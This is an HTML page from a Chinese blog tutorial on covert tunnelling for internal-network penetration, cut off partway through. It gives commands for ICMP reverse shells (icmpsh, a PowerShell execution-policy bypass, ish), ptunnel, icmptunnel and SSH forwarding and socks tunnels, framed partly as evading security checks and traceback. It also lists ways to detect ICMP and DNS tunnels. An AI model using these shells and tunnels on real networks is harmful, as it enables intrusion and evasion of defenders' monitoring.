@@ -1,0 +1,1282 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>内网漫游系列之流量操控与Socks代理总结 | 码中春秋&#39;s Blog</title>
+    <meta property="og:title" content="内网漫游系列之流量操控与Socks代理总结 - 码中春秋&#39;s Blog">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2019-06-05T15:56:31&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2019-06-05T15:56:31&#43;08:00'>
+        
+    <meta name="Keywords" content="码中春秋,博客,,taielab,java,python,项目管理,软件架构,网络安全,数字安全,隐私保护,反侦查,反技侦,匿名方案,open,freedom,democracy,decentralization">
+    <meta name="description" content="内网漫游系列之流量操控与Socks代理总结">
+        
+    <meta name="author" content="码中春秋">
+    <meta property="og:url" content="https://blog.taielab.com/2019-06-05/intranet-roaming-network-traffic-control.html">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+
+
+    
+    
+        <link rel="stylesheet" href='/css/douban.css'>
+    
+        <link rel="stylesheet" href='/css/other.css'>
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://blog.taielab.com">
+                        码中春秋&#39;s Blog
+                    </a>
+                
+                <p class="description">专注于Java企业级开发、数字安全、信息安全、安全运维</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://blog.taielab.com">首页</a>
+                    
+                    <a  href="https://blog.taielab.com/archives/" title="存档">存档</a>
+                    
+                    <a  href="https://blog.taielab.com/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    <style type="text/css">
+    .post-toc {
+        position: fixed;
+        width: 200px;
+        margin-left: -210px;
+        padding: 5px 10px;
+        font-family: Athelas, STHeiti, Microsoft Yahei, serif;
+        font-size: 12px;
+        border: 1px solid rgba(0, 0, 0, .07);
+        border-radius: 5px;
+        background-color: rgba(255, 255, 255, 0.98);
+        background-clip: padding-box;
+        -webkit-box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        box-shadow: 1px 1px 2px rgba(0, 0, 0, .125);
+        word-wrap: break-word;
+        white-space: nowrap;
+        -webkit-box-sizing: border-box;
+        box-sizing: border-box;
+        z-index: 999;
+        cursor: pointer;
+        max-height: 70%;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .post-toc .post-toc-title {
+        width: 100%;
+        margin: 0 auto;
+        font-size: 20px;
+        font-weight: 400;
+        text-transform: uppercase;
+        text-align: center;
+    }
+
+    .post-toc .post-toc-content {
+        font-size: 15px;
+    }
+
+    .post-toc .post-toc-content>nav>ul {
+        margin: 10px 0;
+    }
+
+    .post-toc .post-toc-content ul {
+        padding-left: 20px;
+        list-style: square;
+        margin: 0.5em;
+        line-height: 1.8em;
+    }
+
+    .post-toc .post-toc-content ul ul {
+        padding-left: 15px;
+        display: none;
+    }
+
+    @media print,
+    screen and (max-width:1057px) {
+        .post-toc {
+            display: none;
+        }
+    }
+</style>
+<div class="post-toc" style="position: absolute; top: 188px;">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#场景">场景</a>
+      <ul>
+        <li><a href="#重定向rdirection">重定向（Rdirection）</a></li>
+        <li><a href="#隧道-tunneling">隧道 （Tunneling）</a></li>
+        <li><a href="#封装encapsulation">封装（encapsulation）</a></li>
+      </ul>
+    </li>
+    <li><a href="#网络层隧道">网络层隧道</a>
+      <ul>
+        <li><a href="#icmp隧道">ICMP隧道</a></li>
+        <li><a href="#ipv6隧道">IPV6隧道</a></li>
+      </ul>
+    </li>
+    <li><a href="#应用层隧道">应用层隧道</a>
+      <ul>
+        <li><a href="#dns隧道">DNS隧道</a></li>
+        <li><a href="#ssh隧道">SSH隧道</a></li>
+        <li><a href="#http隧道">HTTP隧道</a></li>
+      </ul>
+    </li>
+    <li><a href="#socks代理">Socks代理</a>
+      <ul>
+        <li><a href="#lcx">Lcx</a></li>
+        <li><a href="#ew">EW</a></li>
+      </ul>
+    </li>
+    <li><a href="#内网漫游">内网漫游</a>
+      <ul>
+        <li><a href="#1windows下使用sockscap64"><strong>1.Windows下使用sockscap64</strong></a></li>
+        <li><a href="#2linux下使用proxychains"><strong>2.LINUX下使用proxychains</strong></a></li>
+        <li><a href="#3regeorgproxifier组合技"><strong>3.reGeorg+Proxifier组合技</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function () {
+        var postToc = $(".post-toc");
+        if (postToc.length) {
+            var leftPos = $("#main").offset().left;
+            if(leftPos<220){
+                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            }
+
+            var t = postToc.offset().top - 20,
+                a = {
+                    start: {
+                        position: "absolute",
+                        top: t
+                    },
+                    process: {
+                        position: "fixed",
+                        top: 20
+                    },
+                };
+            $(window).scroll(function () {
+                var e = $(window).scrollTop();
+                e < t ? postToc.css(a.start) : postToc.css(a.process)
+            })
+        }
+    })
+</script>
+    <article class="post">
+        <header>
+            <h1 class="post-title">内网漫游系列之流量操控与Socks代理总结</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2019年6月5日
+        </date>
+        
+        <div class="post-meta">
+            <span>|</span>
+            
+            <span class="meta-category"><a href='https://blog.taielab.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F'>内网渗透</a></span>
+            
+        </div>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="clear" style="display: none">
+            <div class="toc-article">
+                <div class="toc-title">文章目录</div>
+            </div>
+        </div>
+        
+        <div class="post-content">
+            <h2 id="场景">场景</h2>
+<ul>
+<li>内网机器受到边界防火墙的限制，访问受限的网络环境</li>
+<li>使用隐蔽的手段逃避安全检查措施和溯源追踪</li>
+<li>在非受信任的网络中实现安全的数据传输</li>
+</ul>
+<h3 id="重定向rdirection">重定向（Rdirection）</h3>
+<p>端口转发</p>
+<p>传输使用的明文</p>
+<h3 id="隧道-tunneling">隧道 （Tunneling）</h3>
+<blockquote>
+<p>隧道技术是一种通过使用互联网络的基本设施在网络之间传递数据的方式，使用隧道传递的数据（或负载）可以是<strong>不同协议的数据帧或包</strong>。隧道技术将其他协议的数据帧或者数据包重新封装然后通过<strong>隧道</strong>发送。新的帧头提供路由信息，以便互联网传递被封装的负载数据。 &mdash;-百度百科</p>
+</blockquote>
+<ul>
+<li>在不受信任的网络环境中实现安全的通信</li>
+<li>通常使用多种加密技术建立通信隧道</li>
+<li>点到点（IP2IP）、端到端（Port2Port）隧道</li>
+<li>VPN : PPTP、l2tp、IPSec、SSL vpn</li>
+</ul>
+<h3 id="封装encapsulation">封装（encapsulation）</h3>
+<p>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o HTTP、VoIP）
+使用网关设备实现不同类型网络的互联互通</p>
+<hr>
+<h2 id="网络层隧道">网络层隧道</h2>
+<h3 id="icmp隧道">ICMP隧道</h3>
+<p><strong>场景</strong></p>
+<p>两台机器间，除了允许互ping，其他的TCP/UDP端口一律不允许，此时可以考虑使用ICMP进行穿透</p>
+<p><strong>原理</strong></p>
+<p>Windows系统默认传输32bytes的数据，内容是固定的<code>abcdefghijklmnopqrstuvwabcdefghi</code>，ping包的大小是可以改变的，但是内容依旧不变，循环</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">ping www.baidu.com -t -l 1024bytes
+</code></pre></td></tr></table>
+</div>
+</div><p>Linux系统默认传输48bytes，头信息比较复杂，但是内容也是固定<code>!”#$%&amp;’()+,-./01234567</code></p>
+<p>ICMP隐蔽隧道的原理就是：替换Data部分，利用客户端程序进行接收并处理服务端发送的畸形的ICMP协议（主要是Request和Reply包）</p>
+<p><strong>工具</strong></p>
+<ol>
+<li><a href="https://github.com/inquisb/icmpsh">icmpsh</a></li>
+</ol>
+<p>该工具需要<code>python-impacket</code>库的支持，而且<code>run.sh</code>并不能获取本地IP，所以直接使用<code>python3 icmpsh_m.py 192.168.1.139 192.168.1.161</code>，最大的优点是客户端支持Windows Powershell也能支持，并且无乱码</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> icmpsh.exe -t 192.168.1.139
+
+ powershell.exe -exec bypass -Command <span style="color:#d14">&#34;Import-Module .\Invoke-PowerShellIcmp.ps1;Invoke-PowerShellIcmp -IPAddress 192.168.1.139&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/04/15/5cb42f6ba86a2.png" alt="img"></p>
+<ol>
+<li><a href="http://freshmeat.sourceforge.net/projects/ptunnel/">ptunnle</a></li>
+</ol>
+<p>已经不更新了，支持多并发连接、支持身份验证、需要root</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">server:
+ptunnel -x 123456
+
+Client:
+sudo ptunnel -p proxy_ip -lp listen_port -da des_ip -dp des_port -x 123456
+
+嵌套SSH隧道
+ssh -CNfg -D <span style="color:#099">7000</span> root@127.0.0.1 -p listen_port
+</code></pre></td></tr></table>
+</div>
+</div><ol>
+<li><a href="%5Bhttp://nchc.dl.sourceforge.net/project/icmpshell%5D(https://nchc.dl.sourceforge.net/project/icmpshell)">Icmpshell</a></li>
+</ol>
+<p>下载安装</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://nchc.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz
+tar zxvf ish-v0.2.tar.gz
+<span style="color:#0086b3">cd</span> ISHELL-v0.2/
+make linux 
+</code></pre></td></tr></table>
+</div>
+</div><p>被控端：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./ishd -i <span style="color:#099">433</span> -t <span style="color:#099">0</span> -p 1024
+</code></pre></td></tr></table>
+</div>
+</div><p>控制端：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./ish -i <span style="color:#099">443</span> -t <span style="color:#099">0</span> -p <span style="color:#099">1024</span> 192.168.1.139
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/04/15/5cb42f7b93940.png" alt="img"></p>
+<p>这个工具原理都是一样的，但是与其他俩个工具的不一样之处在于，主动向需要控制的机器发送ICMP数据包，并且产生的ICMP数据包比较少，不容易被IDS等检测系统发现</p>
+<ol>
+<li><a href="https://github.com/jamesbarlow/icmptunnel.git">icmptunnel</a></li>
+</ol>
+<p>都只能在linux下使用，并且需要关闭ICMP响应</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>服务端，启动icmptunnel，并给隧道分配一个IP</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># ./icmptunnel –s</span>
+opened tunnel device: tun0  
+<span style="color:#000;font-weight:bold">(</span>ctrl-z<span style="color:#000;font-weight:bold">)</span>
+<span style="color:#998;font-style:italic"># bg</span>
+<span style="color:#998;font-style:italic"># /sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>客户端，连接服务端，并且给隧道分配一个IP</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># ./icmptunnel &lt;server&gt;</span>
+opened tunnel device: tun0  
+connection established.  
+<span style="color:#000;font-weight:bold">(</span>ctrl-z<span style="color:#000;font-weight:bold">)</span>
+<span style="color:#998;font-style:italic"># bg</span>
+<span style="color:#998;font-style:italic"># /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>客户端就建立了一个端到端的ICMP隧道，其中服务器为10.0.0.1，客户端为10.0.0.2，可以建立一个ssh socks隧道</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -D <span style="color:#099">8080</span> -N root@10.0.0.1
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/04/15/5cb42f8af41cf.png" alt="img"></p>
+<p><strong>检测</strong></p>
+<ol>
+<li>检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道的浏览器在同一时间会产生上千个 ICMP 数据包。</li>
+<li>寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。</li>
+<li>注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。</li>
+<li>检查ICMP数据包的协议标签，例如icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’ 标记以用于识别隧道，这就是特征。</li>
+</ol>
+<h3 id="ipv6隧道">IPV6隧道</h3>
+<p><strong>类型</strong></p>
+<ul>
+<li>IPV6 over IPV4隧道，把IPV6报文封装到IPV4报文中，使IPV6的流量可以穿越IPV4网络</li>
+<li>IPV4 over IPV6隧道，把IPV4报文封装到IPV6中，使IPV4的流量可穿越IPV6</li>
+</ul>
+<h2 id="应用层隧道">应用层隧道</h2>
+<h3 id="dns隧道">DNS隧道</h3>
+<p><strong>场景</strong></p>
+<p>防火墙禁止TCP出站访问流量</p>
+<ul>
+<li>
+<p>SSH隧道、端口转发全部失效</p>
+</li>
+<li>
+<p>使用基于UDP协议的隧道</p>
+</li>
+<li>
+<p>DNS的工作原理适合用于实现隧道</p>
+</li>
+</ul>
+<p><strong>原理</strong></p>
+<p>配置某个域名的NS服务器，使得对该域名的所有子域解析请求最终到达该NS服务器上，然后将另一个协议的数据编码为一系列dns查询，响应时客户端将返回的Response数据进行解码得到另一协议的数据</p>
+<ul>
+<li>利用合法的DNS服务器实现DNS隧道</li>
+<li>C/S （dns2tcpc / dns2tcpd）架构</li>
+<li>通过TXT、CNAME、MX记录加密传输数据（A记录长度有限）</li>
+<li>隧道建立后保持连接</li>
+<li>默认记录生存时间TTL值为3秒</li>
+</ul>
+<p><img src="https://i.loli.net/2019/04/15/5cb42f9c54dce.jpg" alt="img"></p>
+<p><strong>工具</strong></p>
+<p><strong>DNScat2、dns2tcp、iodine、CS</strong></p>
+<p><code>Dns2tcp</code>采用直连，但速度不是特别乐观，优势在于kali直接集成了这个工具，部分linux发行版也都可以直接通过包工具下载，相对方便。<code>iodine</code>和<code>Dnscat2</code>则是目前的主流，<code>Dnscat2</code>提供了灵活的交互模式，而<code>iodine</code>则在编码，请求类型上提供了更丰富的选择，而且在速度方面，其他工具望尘莫及</p>
+<p><strong>方法</strong></p>
+<ul>
+<li>假如能够指定任意DNS服务器查询，且可以正常查询到结果的话，无需域名可以直接通过53通道进行高速上线，此时速度最快</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">nslookup www.baidu.com 8.8.8.8
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果无法指定DNS服务器进行查询，必须上线一个自己的域名，并且是慢速上线，速度较慢</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">nslookup www.baidu.com
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>检测方式</strong></p>
+<ol>
+<li>基于请求域名长度及请求频率统计分析方法，将客户端请求的DNS域名中长度大于长度阈值的以记录下来，然后统计频率，当频率大于频率告警阈值时则判定此客户端使用了 DNS隧道技术</li>
+<li>dnscat 查询中包含了dnscat 字符串，这个可以作为防火墙和入侵检测的特征</li>
+</ol>
+<h3 id="ssh隧道">SSH隧道</h3>
+<ul>
+<li>
+<p>建立双向安全隧道</p>
+<ul>
+<li>将其他TCP端口的通信通过SSH连接转发</li>
+<li>用SSH作为传输层协议，对流量自动加解密</li>
+<li>突破防火墙访问规则的限制</li>
+</ul>
+</li>
+<li>
+<p>SSH本地端口转发</p>
+<ul>
+<li>本机侦听端口，访问转发到远程主机指定端口</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L -CfN &lt;listen posrt&gt; :&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; 
+  
+<span style="color:#998;font-style:italic">#能够共享该隧道</span>
+ssh -L -CfNg &lt;listen posrt&gt; :&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; 
+</code></pre></td></tr></table>
+</div>
+</div><p>基于建立起来的SSH隧道，隧道中断则端口转发中断</p>
+<p>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</p>
+</li>
+<li>
+<p>远程端口转发</p>
+<ul>
+<li>远程侦听端口，访问转发到本机主机指定端口</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -R -CfNg &lt;listen posrt&gt; :&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt; 
+</code></pre></td></tr></table>
+</div>
+</div><p>内网为服务器</p>
+</li>
+<li>
+<p>动态端口转发</p>
+<ul>
+<li>本地侦听socks4/5代理端口，由SSH server决定如何转发</li>
+</ul>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -CfNg -D &lt;listen port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p>不管是利用SSH做转发还是做socks代理，唯一的好处就是通信数据全加密，一定程度上可有效对抗各类IDS、IPS和取证，缺点就是可能速度稍慢，对于渗透Linux内网是比较好的选择。</p>
+<h3 id="http隧道">HTTP隧道</h3>
+<p><strong>原理</strong></p>
+<p>通过HTTP协议与代理服务器建立连接，协议信令中包含要连接到的远程主机的IP和端口，如果有需要身份验证的话还需要加上授权信息，服务器收到信令后首先进行身份验证，通过后便与远程主机建立连接，连接成功之后会返回给客户端200，表示验证通过。此外HTTP隧道是<code>没有进行加密</code>的，不安全的，一般再嵌套一个SSH安全隧道</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
